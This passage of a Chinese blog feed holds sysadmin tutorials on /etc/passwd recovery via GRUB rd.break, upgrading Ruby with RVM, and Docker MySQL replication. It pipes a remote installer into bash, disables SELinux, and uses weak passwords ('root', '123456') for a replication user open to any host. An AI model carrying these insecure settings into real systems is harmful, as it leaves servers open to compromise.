<p>3.口令(passwd):一些系统中，存放着加密后的用户口令字。虽然这个字段存放的只是用户口令的加密串，不是明文，但是由于/etc/passwd文件对所有用户都可读，所以这仍是一个安全隐患。因此，现在许多Linux系统（如SVR4）都使用了shadow技术，把真正的加密后的用户口令字存放到/etc/shadow文件中，而在/etc/passwd文件的口令字段中只存放一个特殊的字符，例如“x”或者“*”。</p>
<p>4.用户标识号(UID):是一个整数，系统内部用它来标识用户。一般情况下它与用户名是一一对应的。如果几个用户名对应的用户标识号是一样的，系统内部将把它们视为同一个用户，但是它们可以有不同的口令、不同的主目录以及不同的登录Shell等。取值范围是0-65535。0是超级用户root的标识号，1-99由系统保留，作为管理账号，普通用户的标识号从100开始。在Linux系统中，这个界限是500。</p>
<p>5.组标识号(GID):字段记录的是用户所属的用户组。它对应着/etc/group文件中的一条记录。</p>
<p>6.注释性描述(users):字段记录着用户的一些个人情况，例如用户的真实姓名、电话、地址等，这个字段并没有什么实际的用途。在不同的Linux系统中，这个字段的格式并没有统一。在许多Linux系统中，这个字段存放的是一段任意的注释性描述文字，用做finger命令的输出。</p>
<p>7.用户主目录(home_directory):也就是用户的起始工作目录，它是用户在登录到系统之后所处的目录。在大多数系统中，各用户的主目录都被组织在同一个特定的目录下，而用户主目录的名称就是该用户的登录名。各用户对自己的主目录有读、写、执行（搜索）权限，其他用户对此目录的访问权限则根据具体情况设置。</p>
<p>8.登录Shell(Shell):用户登录后，要启动一个进程，负责将用户的操作传给内核，这个进程是用户登录到系统后运行的命令解释器或某个特定的程序，即Shell。Shell是用户与Linux系统之间的接口。Linux的Shell有许多种，每种都有不同的特点。如果不指定Shell，那么系统使用sh为默认的登录Shell，即这个字段的值为/bin/sh。</p>
<p>用户的登录Shell可以指定为某个特定的程序（此程序不是一个命令解释器）。利用这一特点，我们可以限制用户只能运行指定的应用程序，在该应用程序运行结束后，用户就自动退出了系统。有些Linux系统要求只有那些在系统中登记了的程序才能出现在这个字段中。</p>
<p>那么我们在操作LInux的时候，如果不小心删掉/etc/passwd文件，我们该怎样解决呢？</p>
<p>一.如果删掉之后未重启系统，那么我们只需要将/etc/passwd-这个引子文件拷贝给/etc/passwd即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#x2F;etc&#x2F;passwd- &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>二.如果我们在删除文件后关闭了系统，打开的时候会发现进不去</p>
<p><img src= "/img/loading.gif" data-src="/2020/01/15/%E5%88%A0%E9%99%A4passwd%E6%96%87%E4%BB%B6%E6%80%8E%E4%B9%88%E5%8A%9E/image-20200828212827249.png" alt="image-20200828212827249"></p>
<p><strong>那我们这样解决:</strong></p>
<p>1.在GRUB引导的时候按e进入编辑模式，linux16那一行的ro 修改为rw rd.break</p>
<p>2.ctrl+x执行</p>
<p>3.进入单用户模式后修改根路径，将引子程序拷进来</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chroot /sysroot</span><br><span class="line"></span><br><span class="line">cp /etc/passwd- /etc/passwd</span><br></pre></td></tr></table></figure>

<p>4.因为拷贝进来文件的安全上下文和当亲目录不匹配，那么我们需要关闭selinux</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/selinux</span><br><span class="line"></span><br><span class="line">selinux = disabled</span><br></pre></td></tr></table></figure>

<p>5.两次exit退出现在的根并且重启主机，恢复正常</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>升级Ruby的版本</title>
    <url>/2019/01/02/%E5%8D%87%E7%BA%A7ruby%E7%9A%84%E7%89%88%E6%9C%AC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="升级ruby的版本"><a href="#升级ruby的版本" class="headerlink" title="升级ruby的版本"></a>升级ruby的版本</h1><p>升级ruby版本，有时候安装ruby的版本过低，需要进行升级，例如安装在centos6.7安装fpm需要ruby版本在1.9以上。</p>
<h2 id="1、主机环境如下："><a href="#1、主机环境如下：" class="headerlink" title="1、主机环境如下："></a>1、主机环境如下：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@test ~]# cat /etc/redhat-release </span><br><span class="line">CentOS release 6.7 (Final)</span><br><span class="line">[root@test ~]# uname -r</span><br><span class="line">2.6.32-573.el6.x86_64</span><br></pre></td></tr></table></figure>

<h2 id="2、使用yum安装ruby"><a href="#2、使用yum安装ruby" class="headerlink" title="2、使用yum安装ruby"></a>2、使用yum安装ruby</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@web ~]# yum install rubygems ruby-devel</span><br><span class="line">Loaded plugins: fastestmirror, security</span><br><span class="line">Setting up Install Process</span><br><span class="line">base                                                                                                   | 3.7 kB     00:00</span><br><span class="line">base/primary_db                                                                                        | 4.7 MB     00:02</span><br><span class="line">extras                                                                                                 | 3.4 kB     00:00</span><br><span class="line">extras/primary_db                                                                                      |  30 kB     00:00</span><br><span class="line">updates                                                                                                | 3.4 kB     00:00</span><br><span class="line">updates/primary_db                                                                                     | 8.1 MB     00:01</span><br><span class="line">Resolving Dependencies</span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Running transaction check</span></span><br><span class="line"><span class="meta">---&gt;</span><span class="bash"> Package ruby-devel.x86_64 0:1.8.7.374-5.el6 will be installed</span></span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Processing Dependency: ruby-libs = 1.8.7.374-5.el6 <span class="keyword">for</span> package: ruby-devel-1.8.7.374-5.el6.x86_64</span></span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Processing Dependency: libruby.so.1.8()(64bit) <span class="keyword">for</span> package: ruby-devel-1.8.7.374-5.el6.x86_64</span></span><br><span class="line"><span class="meta">---&gt;</span><span class="bash"> Package rubygems.noarch 0:1.3.7-5.el6 will be installed</span></span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Processing Dependency: ruby-rdoc <span class="keyword">for</span> package: rubygems-1.3.7-5.el6.noarch</span></span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Processing Dependency: /usr/bin/ruby <span class="keyword">for</span> package: rubygems-1.3.7-5.el6.noarch</span></span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Running transaction check</span></span><br><span class="line"><span class="meta">---&gt;</span><span class="bash"> Package ruby.x86_64 0:1.8.7.374-5.el6 will be installed</span></span><br><span class="line"><span class="meta">---&gt;</span><span class="bash"> Package ruby-libs.x86_64 0:1.8.7.374-5.el6 will be installed</span></span><br><span class="line"><span class="meta">---&gt;</span><span class="bash"> Package ruby-rdoc.x86_64 0:1.8.7.374-5.el6 will be installed</span></span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Processing Dependency: ruby-irb = 1.8.7.374-5.el6 <span class="keyword">for</span> package: ruby-rdoc-1.8.7.374-5.el6.x86_64</span></span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Running transaction check</span></span><br><span class="line"><span class="meta">---&gt;</span><span class="bash"> Package ruby-irb.x86_64 0:1.8.7.374-5.el6 will be installed</span></span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Finished Dependency Resolution</span></span><br><span class="line"></span><br><span class="line">Dependencies Resolved</span><br><span class="line"></span><br><span class="line">==============================================================================================================================</span><br><span class="line"> Package                        Arch                       Version                             Repository                Size</span><br><span class="line">==============================================================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> ruby-devel                     x86_64                     1.8.7.374-5.el6                     base                     318 k</span><br><span class="line"> rubygems                       noarch                     1.3.7-5.el6                         base                     207 k</span><br><span class="line">Installing for dependencies:</span><br><span class="line"> ruby                           x86_64                     1.8.7.374-5.el6                     base                     538 k</span><br><span class="line"> ruby-irb                       x86_64                     1.8.7.374-5.el6                     base                     318 k</span><br><span class="line"> ruby-libs                      x86_64                     1.8.7.374-5.el6                     base                     1.7 M</span><br><span class="line"> ruby-rdoc                      x86_64                     1.8.7.374-5.el6                     base                     381 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">==============================================================================================================================</span><br><span class="line">Install       6 Package(s)</span><br><span class="line"></span><br><span class="line">Total download size: 3.4 M</span><br><span class="line">Installed size: 12 M</span><br><span class="line">Is this ok [y/N]: y</span><br><span class="line">Downloading Packages:</span><br><span class="line">(1/6): ruby-1.8.7.374-5.el6.x86_64.rpm                                                                 | 538 kB     00:00</span><br><span class="line">(2/6): ruby-devel-1.8.7.374-5.el6.x86_64.rpm                                                           | 318 kB     00:00</span><br><span class="line">(3/6): ruby-irb-1.8.7.374-5.el6.x86_64.rpm                                                             | 318 kB     00:00</span><br><span class="line">(4/6): ruby-libs-1.8.7.374-5.el6.x86_64.rpm                                                            | 1.7 MB     00:01</span><br><span class="line">(5/6): ruby-rdoc-1.8.7.374-5.el6.x86_64.rpm                                                            | 381 kB     00:00</span><br><span class="line">(6/6): rubygems-1.3.7-5.el6.noarch.rpm                                                                 | 207 kB     00:00</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">Total                                                                                         502 kB/s | 3.4 MB     00:06</span><br><span class="line">warning: rpmts_HdrFromFdno: Header V3 RSA/SHA1 Signature, key ID c105b9de: NOKEY</span><br><span class="line">Retrieving key from file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6</span><br><span class="line">Importing GPG key 0xC105B9DE:</span><br><span class="line"> Userid : CentOS-6 Key (CentOS 6 Official Signing Key) &lt;centos-6-key@centos.org&gt;</span><br><span class="line"> Package: centos-release-6-7.el6.centos.12.3.x86_64 (@anaconda-CentOS-201508042137.x86_64/6.7)</span><br><span class="line"> From   : /etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6</span><br><span class="line">Is this ok [y/N]: y</span><br><span class="line">Running rpm_check_debug</span><br><span class="line">Running Transaction Test</span><br><span class="line">Transaction Test Succeeded</span><br><span class="line">Running Transaction</span><br><span class="line">  Installing : ruby-libs-1.8.7.374-5.el6.x86_64                                                                           1/6</span><br><span class="line">  Installing : ruby-1.8.7.374-5.el6.x86_64                                                                                2/6</span><br><span class="line">  Installing : ruby-irb-1.8.7.374-5.el6.x86_64                                                                            3/6</span><br><span class="line">  Installing : ruby-rdoc-1.8.7.374-5.el6.x86_64                                                                           4/6</span><br><span class="line">  Installing : rubygems-1.3.7-5.el6.noarch                                                                                5/6</span><br><span class="line">  Installing : ruby-devel-1.8.7.374-5.el6.x86_64                                                                          6/6</span><br><span class="line">  Verifying  : ruby-rdoc-1.8.7.374-5.el6.x86_64                                                                           1/6</span><br><span class="line">  Verifying  : ruby-1.8.7.374-5.el6.x86_64                                                                                2/6</span><br><span class="line">  Verifying  : rubygems-1.3.7-5.el6.noarch                                                                                3/6</span><br><span class="line">  Verifying  : ruby-libs-1.8.7.374-5.el6.x86_64                                                                           4/6</span><br><span class="line">  Verifying  : ruby-irb-1.8.7.374-5.el6.x86_64                                                                            5/6</span><br><span class="line">  Verifying  : ruby-devel-1.8.7.374-5.el6.x86_64                                                                          6/6</span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">  ruby-devel.x86_64 0:1.8.7.374-5.el6                              rubygems.noarch 0:1.3.7-5.el6</span><br><span class="line"></span><br><span class="line">Dependency Installed:</span><br><span class="line">  ruby.x86_64 0:1.8.7.374-5.el6             ruby-irb.x86_64 0:1.8.7.374-5.el6        ruby-libs.x86_64 0:1.8.7.374-5.el6</span><br><span class="line">  ruby-rdoc.x86_64 0:1.8.7.374-5.el6</span><br><span class="line"></span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure>

<h2 id="3、查看ruby的版本"><a href="#3、查看ruby的版本" class="headerlink" title="3、查看ruby的版本"></a>3、查看ruby的版本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1 [root@web ~]# ruby -v</span><br><span class="line">2 ruby 1.8.7 (2013-06-27 patchlevel 374) [x86_64-linux]</span><br></pre></td></tr></table></figure>

<h2 id="4、升级ruby1-9-3版本"><a href="#4、升级ruby1-9-3版本" class="headerlink" title="4、升级ruby1.9.3版本"></a>4、升级ruby1.9.3版本</h2><h3 id="1）删除原来的rubygems仓库"><a href="#1）删除原来的rubygems仓库" class="headerlink" title="1）删除原来的rubygems仓库"></a>1）删除原来的rubygems仓库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@web ~]# gem sources --remove http://rubygems.org/</span><br></pre></td></tr></table></figure>

<h3 id="2）添加aliyun的rubygems仓库"><a href="#2）添加aliyun的rubygems仓库" class="headerlink" title="2）添加aliyun的rubygems仓库"></a>2）添加aliyun的rubygems仓库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@web ~]# gem sources -a http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;rubygems&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="3）查看rubygems仓库"><a href="#3）查看rubygems仓库" class="headerlink" title="3）查看rubygems仓库"></a>3）查看rubygems仓库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@web ~]# gem sources -l</span><br><span class="line">*** CURRENT SOURCES ***</span><br><span class="line"> </span><br><span class="line">http://mirrors.aliyun.com/rubygems/</span><br></pre></td></tr></table></figure>

<h3 id="4）使用RVM进行升级ruby"><a href="#4）使用RVM进行升级ruby" class="headerlink" title="4）使用RVM进行升级ruby"></a>4）使用RVM进行升级ruby</h3><h5 id="a-在rvm官方网址：https-rvm-io-执行如下命令："><a href="#a-在rvm官方网址：https-rvm-io-执行如下命令：" class="headerlink" title="a:在rvm官方网址：https://rvm.io/执行如下命令："></a>a:在rvm官方网址：<a href="https://rvm.io/执行如下命令：" target="_blank" rel="noopener">https://rvm.io/执行如下命令：</a></h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@web ~]#  gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB</span><br><span class="line">gpg: requesting key D39DC0E3 from hkp server keys.gnupg.net</span><br><span class="line">gpg: requesting key 39499BDB from hkp server keys.gnupg.net</span><br><span class="line">gpg: key D39DC0E3: "Michal Papis (RVM signing) &lt;mpapis@gmail.com&gt;" not changed</span><br><span class="line">gpg: key 39499BDB: public key "Piotr Kuczynski &lt;piotr.kuczynski@gmail.com&gt;" imported</span><br><span class="line">gpg: no ultimately trusted keys found</span><br><span class="line">gpg: Total number processed: 2</span><br><span class="line">gpg:               imported: 1  (RSA: 1)</span><br><span class="line">gpg:              unchanged: 1</span><br></pre></td></tr></table></figure>

<h5 id="b-接着执行如下命令："><a href="#b-接着执行如下命令：" class="headerlink" title="b:接着执行如下命令："></a>b:接着执行如下命令：</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@web ~]# \curl -sSL https://get.rvm.io | bash -s stable</span><br><span class="line">Downloading https://github.com/rvm/rvm/archive/1.29.3.tar.gz</span><br><span class="line">curl: (35) SSL connect error</span><br><span class="line"></span><br><span class="line">Could not download 'https://github.com/rvm/rvm/archive/1.29.3.tar.gz'.</span><br><span class="line">  curl returned status '35'.</span><br><span class="line"></span><br><span class="line">Downloading https://bitbucket.org/mpapis/rvm/get/1.29.3.tar.gz</span><br><span class="line">Downloading https://bitbucket.org/mpapis/rvm/downloads/1.29.3.tar.gz.asc</span><br><span class="line">curl: (7) couldn't connect to host</span><br><span class="line"></span><br><span class="line">Could not download 'https://bitbucket.org/mpapis/rvm/downloads/1.29.3.tar.gz.asc'.</span><br><span class="line">  curl returned status '7'.</span><br><span class="line"></span><br><span class="line">Creating group 'rvm'</span><br><span class="line"></span><br><span class="line">Installing RVM to /usr/local/rvm/</span><br><span class="line">Installation of RVM in /usr/local/rvm/ is almost complete:</span><br><span class="line"></span><br><span class="line">  * First you need to add all users that will be using rvm to 'rvm' group,</span><br><span class="line">    and logout - login again, anyone using rvm will be operating with `umask u=rwx,g=rwx,o=rx`.</span><br><span class="line"></span><br><span class="line">  * To start using RVM you need to run `source /etc/profile.d/rvm.sh`</span><br><span class="line">    in all your open shell windows, in rare cases you need to reopen all shell windows.</span><br></pre></td></tr></table></figure>

<h5 id="c-执行上述命令"><a href="#c-执行上述命令" class="headerlink" title="c:执行上述命令"></a>c:执行上述命令</h5><p> To start using RVM you need to run <code>source /etc/profile.d/rvm.sh</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@web ~]# source /etc/profile.d/rvm.sh</span><br></pre></td></tr></table></figure>

<h2 id="5、查看RVM可安装的ruby的版本"><a href="#5、查看RVM可安装的ruby的版本" class="headerlink" title="5、查看RVM可安装的ruby的版本"></a>5、查看RVM可安装的ruby的版本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@web ~]# rvm list known</span><br><span class="line"><span class="meta">#</span><span class="bash"> MRI Rubies</span></span><br><span class="line">[ruby-]1.8.6[-p420]</span><br><span class="line">[ruby-]1.8.7[-head] # security released on head</span><br><span class="line">[ruby-]1.9.1[-p431]</span><br><span class="line">[ruby-]1.9.2[-p330]</span><br><span class="line">[ruby-]1.9.3[-p551]</span><br><span class="line">[ruby-]2.0.0[-p648]</span><br><span class="line">[ruby-]2.1[.10]</span><br><span class="line">[ruby-]2.2[.7]</span><br><span class="line">[ruby-]2.3[.4]</span><br><span class="line">[ruby-]2.4[.1]</span><br><span class="line">ruby-head</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">for</span> forks use: rvm install ruby-head-&lt;name&gt; --url https://github.com/github/ruby.git --branch 2.2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> JRuby</span></span><br><span class="line">jruby-1.6[.8]</span><br><span class="line">jruby-1.7[.27]</span><br><span class="line">jruby[-9.1.13.0]</span><br><span class="line">jruby-head</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Rubinius</span></span><br><span class="line">rbx-1[.4.3]</span><br><span class="line">rbx-2.3[.0]</span><br><span class="line">rbx-2.4[.1]</span><br><span class="line">rbx-2[.5.8]</span><br><span class="line">rbx-3[.84]</span><br><span class="line">rbx-head</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Opal</span></span><br><span class="line">opal</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Minimalistic ruby implementation - ISO 30170:2012</span></span><br><span class="line">mruby-1.0.0</span><br><span class="line">mruby-1.1.0</span><br><span class="line">mruby-1.2.0</span><br><span class="line">mruby-1[.3.0]</span><br><span class="line">mruby[-head]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Ruby Enterprise Edition</span></span><br><span class="line">ree-1.8.6</span><br><span class="line">ree[-1.8.7][-2012.02]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Topaz</span></span><br><span class="line">topaz</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> MagLev</span></span><br><span class="line">maglev[-head]</span><br><span class="line">maglev-1.0.0</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Mac OS X Snow Leopard Or Newer</span></span><br><span class="line">macruby-0.10</span><br><span class="line">macruby-0.11</span><br><span class="line">macruby[-0.12]</span><br><span class="line">macruby-nightly</span><br><span class="line">macruby-head</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> IronRuby</span></span><br><span class="line">ironruby[-1.1.3]</span><br><span class="line">ironruby-head</span><br></pre></td></tr></table></figure>

<h2 id="6、安装ruby-1-9-3版本"><a href="#6、安装ruby-1-9-3版本" class="headerlink" title="6、安装ruby-1.9.3版本"></a>6、安装ruby-1.9.3版本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@web ~]# rvm install 1.9.3</span><br><span class="line">Searching for binary rubies, this might take some time.</span><br><span class="line">Found remote file https://rvm_io.global.ssl.fastly.net/binaries/centos/6/x86_64/ruby-1.9.3-p551.tar.bz2</span><br><span class="line">Checking requirements for centos.</span><br><span class="line">Installing requirements for centos.</span><br><span class="line">Installing required packages: libffi-devel, readline-devel, sqlite-devel, zlib-devel, libyaml-devel, openssl-devel...........|</span><br><span class="line">Requirements installation successful.</span><br><span class="line">ruby-1.9.3-p551 - #configure</span><br><span class="line">ruby-1.9.3-p551 - #download</span><br><span class="line"><span class="meta">  %</span><span class="bash"> Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 10.2M  100 10.2M    0     0   188k      0  0:00:55  0:00:55 --:--:--  223k</span><br><span class="line">ruby-1.9.3-p551 - #validate archive</span><br><span class="line">ruby-1.9.3-p551 - #extract</span><br><span class="line">ruby-1.9.3-p551 - #validate binary</span><br><span class="line">ruby-1.9.3-p551 - #setup</span><br><span class="line">ruby-1.9.3-p551 - #gemset created /usr/local/rvm/gems/ruby-1.9.3-p551@global</span><br><span class="line">ruby-1.9.3-p551 - #importing gemset /usr/local/rvm/gemsets/global.gems...................................</span><br><span class="line">ruby-1.9.3-p551 - #generating global wrappers........</span><br><span class="line">ruby-1.9.3-p551 - #gemset created /usr/local/rvm/gems/ruby-1.9.3-p551</span><br><span class="line">ruby-1.9.3-p551 - #importing gemsetfile /usr/local/rvm/gemsets/default.gems evaluated to empty gem list</span><br><span class="line">ruby-1.9.3-p551 - #generating default wrappers........</span><br></pre></td></tr></table></figure>

<h2 id="7、查看ruby是否升级成功"><a href="#7、查看ruby是否升级成功" class="headerlink" title="7、查看ruby是否升级成功"></a>7、查看ruby是否升级成功</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@web ~]# ruby -v</span><br><span class="line">ruby 1.9.3p551 (2014-11-13 revision 48407) [x86_64-linux]</span><br></pre></td></tr></table></figure>

<p>至此，ruby版本升级成功</p>
]]></content>
      <categories>
        <category>Ruby</category>
      </categories>
      <tags>
        <tag>Ruby</tag>
      </tags>
  </entry>
  <entry>
    <title>基于docker+mysql实现主从同步配置方法</title>
    <url>/2020/08/16/%E5%9F%BA%E4%BA%8Edocker+mysql%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="基于docker-mysql实现主从同步配置方法"><a href="#基于docker-mysql实现主从同步配置方法" class="headerlink" title="基于docker+mysql实现主从同步配置方法"></a>基于docker+mysql实现主从同步配置方法</h1><h2 id="1-先建立数据存放目录"><a href="#1-先建立数据存放目录" class="headerlink" title="1.先建立数据存放目录"></a>1.先建立数据存放目录</h2><p>（～/test/mysql_test/）</p>
<p>使用tree查看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--mysql</span><br><span class="line">   --master</span><br><span class="line">      --data  </span><br><span class="line">      --conf</span><br><span class="line">         --my.cnf     </span><br><span class="line">   --slave</span><br><span class="line">      --data  </span><br><span class="line">      --conf</span><br><span class="line">         --my.cnf</span><br></pre></td></tr></table></figure>

<h2 id="2-准备好-Mysql-Master（主库）和Mysql-Slave（从库）的my-cnf文件"><a href="#2-准备好-Mysql-Master（主库）和Mysql-Slave（从库）的my-cnf文件" class="headerlink" title="2.准备好 Mysql Master（主库）和Mysql Slave（从库）的my.cnf文件"></a>2.准备好 Mysql Master（主库）和Mysql Slave（从库）的my.cnf文件</h2><p><strong>Master my.cnf</strong> 配置文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">server_id = 1</span><br><span class="line"></span><br><span class="line">log-bin= mysql-bin</span><br><span class="line">read-only=0</span><br><span class="line"></span><br><span class="line">replicate-ignore-db=mysql</span><br><span class="line">replicate-ignore-db=sys</span><br><span class="line">replicate-ignore-db=information_schema</span><br><span class="line">replicate-ignore-db=performance_schema</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">!includedir /etc/mysql/conf.d/</span><br><span class="line">!includedir /etc/mysql/mysql.conf.d/</span><br></pre></td></tr></table></figure>

<p><strong>Slave my.cnf</strong> 配置文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">server_id = 2</span><br><span class="line"></span><br><span class="line">log-bin= mysql-bin</span><br><span class="line">read-only=1</span><br><span class="line"></span><br><span class="line">replicate-ignore-db=mysql</span><br><span class="line">replicate-ignore-db=sys</span><br><span class="line">replicate-ignore-db=information_schema</span><br><span class="line">replicate-ignore-db=performance_schema</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">!includedir /etc/mysql/conf.d/</span><br><span class="line">!includedir /etc/mysql/mysql.conf.d/</span><br></pre></td></tr></table></figure>

<p><em>注：在本文中，由上述my.cnf配置文件可得知，主从同步针对的数据库（除了mysql,sys,information_schema,performance_schema这些以外）的其它所有数据库都会进行同步（含数据库、表、数据等）</em></p>
<p><strong>小结：</strong></p>
<ul>
<li>由上述master my.cnf和slave my.cnf配置文件中可知，两者的区别主要在于server_id和read-only值不同</li>
<li>server_id标识服务实例，master和slave值需要保证唯一</li>
<li>read-only中值为0表示支持可读写、1的话表明仅支持可读</li>
</ul>
<h2 id="3-创建master主容器"><a href="#3-创建master主容器" class="headerlink" title="3.创建master主容器"></a>3.创建master主容器</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run --name mastermysql -d -p 3307:3306 -e MYSQL_ROOT_PASSWORD=root -v ~/test/mysql_test/master/data:/var/lib/mysql -v ~/test/mysql_test/master/conf/my.cnf:/etc/mysql/my.cnf mysql:5.7</span><br></pre></td></tr></table></figure>

<h2 id="4-创建slave从容器"><a href="#4-创建slave从容器" class="headerlink" title="4.创建slave从容器"></a>4.创建slave从容器</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run --name slavemysql -d -p 3308:3306 -e MYSQL_ROOT_PASSWORD=root -v ~/test/mysql_test/slave/data:/var/lib/mysql -v ~/test/mysql_test/slave/conf/my.cnf:/etc/mysql/my.cnf mysql:5.7</span><br></pre></td></tr></table></figure>

<h2 id="5-master容器设置"><a href="#5-master容器设置" class="headerlink" title="5.master容器设置"></a>5.master容器设置</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//进入master容器</span><br><span class="line"></span><br><span class="line">docker exec -it mastermysql bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//启动mysql命令，刚在创建窗口时我们把密码设置为：root</span><br><span class="line"></span><br><span class="line">mysql -u root -p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//创建一个用户来同步数据，每个slave使用标准的MySQL用户名和密码连接master。进行复制操作的用户会授予REPLICATION SLAVE 权限。</span><br><span class="line"></span><br><span class="line">CREATE USER 'slave'@ '%' IDENTIFIED BY '123456';  (其实可省略)</span><br><span class="line">GRANT REPLICATION SLAVE ON *.* to 'slave'@'%' identified by '123456';</span><br><span class="line"></span><br><span class="line">//这里表示创建一个slaver同步账号slave，允许访问的IP地址为%，%表示通配符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//查看状态，记住File、Position的值，在Slave中将用到</span><br><span class="line">show master status/G;</span><br></pre></td></tr></table></figure>

<h2 id="6-slave容器设置"><a href="#6-slave容器设置" class="headerlink" title="6.slave容器设置"></a>6.slave容器设置</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//进入slaver容器</span><br><span class="line">docker exec -it slavemysql bash</span><br><span class="line"></span><br><span class="line">//启动mysql命令，刚在创建窗口时我们把密码设置为：root</span><br><span class="line">mysql -u root -p</span><br><span class="line"></span><br><span class="line">//设置主库链接</span><br><span class="line">change master to master_host='172.17.0.2',master_user='slave',master_password='123456',master_log_file='mysql-bin.000001',master_log_pos=0,master_port=3306;</span><br><span class="line"></span><br><span class="line">//启动从库同步</span><br><span class="line">start slave;</span><br><span class="line"></span><br><span class="line">//查看状态</span><br><span class="line">show slave status\G;</span><br></pre></td></tr></table></figure>

<p>如果 show slave status\G命令结果中出现： Slave_IO_Running: Yes Slave_SQL_Running: Yes 以上两项都为Yes，那说明没问题了。</p>
<h2 id="注意事宜"><a href="#注意事宜" class="headerlink" title="注意事宜"></a>注意事宜</h2><p>1 首先在主从没有生效的时候，要保持两台服务器数据库、表相同，数据相同</p>
<p>那如何实现主从库在开始之间的同步呢</p>
<p>*<em>master容器上执行： *</em></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -p --all-databases &gt;/root/all_database.sql</span><br></pre></td></tr></table></figure>

<p>将all_database.sql拷贝到从库中来，在slave从库容器上执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p &lt;all_database.sql</span><br></pre></td></tr></table></figure>

<p>如此两步骤，主库和从库数据会追加相平，保持同步！</p>
<p>再此过程中，若主库存在业务，在同步的时候要先锁表，让其不要有修改！</p>
<p>#如需要，可以master容器中，执行以下命令锁定数据库以防止写入数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt;FLUSH TABLES WITH READ LOCK;</span><br></pre></td></tr></table></figure>

<p>等待主从数据追平，主从同步后在打开锁！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#解锁数据表。</span><br><span class="line"></span><br><span class="line">mysql&gt;UNLOCK TABLES;</span><br></pre></td></tr></table></figure>

<p>主从数据追平后，定位好从库到主库日志的文件名字，和相应的位置</p>
